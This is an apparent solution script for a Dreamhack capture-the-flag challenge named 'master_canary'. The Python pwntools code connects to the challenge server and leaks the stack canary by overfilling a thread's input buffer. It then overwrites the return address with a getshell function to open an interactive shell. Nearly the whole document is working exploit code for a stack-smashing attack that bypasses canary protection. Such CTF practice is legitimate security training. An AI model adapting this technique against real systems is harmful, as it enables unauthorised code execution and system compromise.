from pwn import *
from concurrent.futures import ThreadPoolExecutor

elf = ELF('/home/kali/Downloads/dreamhack/master_canary/master_canary')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:20197'

ip, port = cyberedu.split(':')
port = int(port)

#if args.REMOTE:
#    p = remote(ip, port)
#else:
#    p = elf.process()


def create_thread(p):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    
def send_input(p, size, data):
    p.recvuntil(b"> ")
    p.sendline(b"2")
    
    p.recvuntil(b": ")
    p.sendline(size)
    
    p.recvuntil(b": ")
    p.sendline(data)
    
    p.recvuntil(b": ")
    printed = p.recvuntil(b"1.", drop=True)
    print(f"data printed was {printed}")
    return printed
    
def exit(p, comment):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    
    p.recvuntil(b": ")
    p.sendline(comment)
    

getshell = 0x400a4b

def find_canary(j):

    #i = 8 * j + 1
    i = 2281
    
    try:
        p = remote(ip, port)
        create_thread(p)
        
        canary_leak = send_input(p, str(i), b"A"*(i-1) + b"B")
        garbage, canary_bytes = canary_leak.split(b"B")
        canary_bytes = canary_bytes[0:7]
        canary = u64(canary_bytes.rjust(8, b"\x00"))
    
        print(f"found canary {hex(canary)}")
        if canary == 0x0:
            return
            
        payload = (b"A" * 40 +
                   p64(canary) +
                   b"B"*8 +
                   p64(getshell)
                  )
                      
        exit(p, payload)
        p.sendline(b"ls")
        p.interactive()
                   
    except:
        pass
    
#with ThreadPoolExecutor(max_workers=10) as executor:
#    executor.map(find_canary, range(0, 500))

find_canary(0)

